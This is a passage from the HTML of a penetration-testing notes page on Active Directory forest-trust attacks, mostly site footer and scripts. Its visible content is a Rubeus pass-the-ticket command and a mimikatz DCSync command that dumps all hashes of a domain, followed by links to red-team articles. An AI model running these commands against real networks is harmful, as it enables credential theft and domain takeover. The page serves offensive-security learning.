<a href="#__codelineno-70-8" id="__codelineno-70-8" name="__codelineno-70-8"></a><span class="n">Rubeus</span><span class="p">.</span><span class="n">exe</span> <span class="n">ptt</span> <span class="p">/</span><span class="n">ticket</span><span class="p">:&lt;</span><span class="n">Base64ValueofCapturedTicket</span><span class="p">&gt;</span>
<a href="#__codelineno-70-9" id="__codelineno-70-9" name="__codelineno-70-9"></a>
<a href="#__codelineno-70-10" id="__codelineno-70-10" name="__codelineno-70-10"></a><span class="c">#Dump the hashes of the target domain using mimikatz:</span>
<a href="#__codelineno-70-11" id="__codelineno-70-11" name="__codelineno-70-11"></a><span class="n">lsadump</span><span class="p">::</span><span class="n">dcsync</span> <span class="p">/</span><span class="n">domain</span><span class="p">:</span><span class="n">external</span><span class="p">.</span><span class="n">forest</span><span class="p">.</span><span class="n">local</span> <span class="p">/</span><span class="n">all</span>
</code></pre></div> <p>Detailed Articles:</p> <ul> <li><a href="https://www.harmj0y.net/blog/redteaming/not-a-security-boundary-breaking-forest-trusts/">Not A Security Boundary: Breaking Forest Trusts</a></li> <li><a href="https://posts.specterops.io/hunting-in-active-directory-unconstrained-delegation-forests-trusts-71f2b33688e1">Hunting in Active Directory: Unconstrained Delegation &amp; Forests Trusts</a></li> </ul> </article> </div> <script>var input,hash=location.hash.slice(1);hash.startsWith("__tabbed_")&&((input=document.getElementById(hash)).checked=!0)</script> </div> <a class="md-top md-icon" data-md-component="top" hidden="" href="#"> <svg viewbox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8v12Z"></path></svg> Back to top </a> </main> <footer class="md-footer"> <nav aria-label="Footer" class="md-footer__inner md-grid"> <a aria-label="Previous: Enumeration/Attacks" class="md-footer__link md-footer__link--prev" href="../enumeration_and_attacks/" rel="prev"> <div class="md-footer__button md-icon"> <svg viewbox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12Z"></path></svg> </div> <div class="md-footer__title"> <div class="md-ellipsis"> <span class="md-footer__direction"> Previous </span> Enumeration/Attacks </div> </div> </a> <a aria-label="Next: Linux" class="md-footer__link md-footer__link--next" href="../../privesc/linux/" rel="next"> <div class="md-footer__title"> <div class="md-ellipsis"> <span class="md-footer__direction"> Next </span> Linux </div> </div> <div class="md-footer__button md-icon"> <svg viewbox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M4 11v2h12l-5.5 5.5 1.42 1.42L19.84 12l-7.92-7.92L10.5 5.5 16 11H4Z"></path></svg> </div> </a> </nav> <div class="md-footer-meta md-typeset"> <div class="md-footer-meta__inner md-grid"> <div class="md-copyright"> <div class="md-copyright__highlight"> Copyright  2021 - 2022 neutronsec </div> </div> <div class="md-social"> <a class="md-social__link" href="https://github.com/neutronsec" rel="noopener" target="_blank" title="github.com"> <svg viewbox="0 0 496 512" xmlns="http://www.w3.org/2000/svg"><!-- Font Awesome Free 6.2.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2022 Fonticons, Inc.--><path d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6zm-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3zm44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9zM244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8zM97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1zm-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7zm32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1zm-11.4-14.7c-1.6 1-1.6 3.6 0 5.9 1.6 2.3 4.3 3.3 5.6 2.3 1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2z"></path></svg> </a> <a class="md-social__link" href="https://twitter.com/neutronctf" rel="noopener" target="_blank" title="twitter.com"> <svg viewbox="0 0 512 512" xmlns="http://www.w3.org/2000/svg"><!-- Font Awesome Free 6.2.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2022 Fonticons, Inc.--><path d="M459.37 151.716c.325 4.548.325 9.097.325 13.645 0 138.72-105.583 298.558-298.558 298.558-59.452 0-114.68-17.219-161.137-47.106 8.447.974 16.568 1.299 25.34 1.299 49.055 0 94.213-16.568 130.274-44.832-46.132-.975-84.792-31.188-98.112-72.772 6.498.974 12.995 1.624 19.818 1.624 9.421 0 18.843-1.3 27.614-3.573-48.081-9.747-84.143-51.98-84.143-102.985v-1.299c13.969 7.797 30.214 12.67 47.431 13.319-28.264-18.843-46.781-51.005-46.781-87.391 0-19.492 5.197-37.36 14.294-52.954 51.655 63.675 129.3 105.258 216.365 109.807-1.624-7.797-2.599-15.918-2.599-24.04 0-57.828 46.782-104.934 104.934-104.934 30.213 0 57.502 12.67 76.67 33.137 23.715-4.548 46.456-13.32 66.599-25.34-7.798 24.366-24.366 44.833-46.132 57.827 21.117-2.273 41.584-8.122 60.426-16.243-14.292 20.791-32.161 39.308-52.628 54.253z"></path></svg> </a> <a class="md-social__link" href="https://secops.cc" rel="noopener" target="_blank" title="secops.cc"> <svg viewbox="0 0 448 512" xmlns="http://www.w3.org/2000/svg"><!-- Font Awesome Free 6.2.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2022 Fonticons, Inc.--><path d="M416 32H31.9C14.3 32 0 46.5 0 64.3v383.4C0 465.5 14.3 480 31.9 480H416c17.6 0 32-14.5 32-32.3V64.3c0-17.8-14.4-32.3-32-32.3zM135.4 416H69V202.2h66.5V416zm-33.2-243c-21.3 0-38.5-17.3-38.5-38.5S80.9 96 102.2 96c21.2 0 38.5 17.3 38.5 38.5 0 21.3-17.2 38.5-38.5 38.5zm282.1 243h-66.4V312c0-24.8-.5-56.7-34.5-56.7-34.6 0-39.9 27-39.9 54.9V416h-66.4V202.2h63.7v29.2h.9c8.9-16.8 30.6-34.5 62.9-34.5 67.2 0 79.7 44.3 79.7 101.9V416z"></path></svg> </a> <a class="md-social__link" href="mailto:hello@neutronsec.com" rel="noopener" target="_blank" title=""> <svg viewbox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M20 4H4c-1.11 0-2 .89-2 2v12a2 2 0 0 0 2 2h16a2 2 0 0 0 2-2V6a2 2 0 0 0-2-2m-3 13H7v-2h10m0-2H7v-2h10m3-2h-3V6h3"></path></svg> </a> </div> </div> </div> </footer> </div> <div class="md-dialog" data-md-component="dialog"> <div class="md-dialog__inner md-typeset"></div> </div> <script id="__config" type="application/json">{"base": "../../..", "features": ["announce.dismiss", "content.code.annotate", "content.tooltips", "navigation.indexes", "navigation.sections", "navigation.tabs", "navigation.top", "navigation.tracking", "search.highlight", "search.share", "search.suggest", "toc.follow", "toc.integrate"], "search": "../../../assets/javascripts/workers/search.720157f5.min.js", "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.config.lang": "en", "search.config.pipeline": "stopWordFilter", "search.config.separator": "[\\s\\-]+", "search.placeholder": "Search", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version.title": "Select version"}}</script> <script src="../../../assets/javascripts/bundle.d36b1844.min.js"></script> <script>const lightbox = GLightbox({"touchNavigation": true, "loop": false, "width": "100%", "height": "auto", "zoomable": true, "draggable": true, "openEffect": "zoom", "closeEffect": "zoom"});</script></body> </html>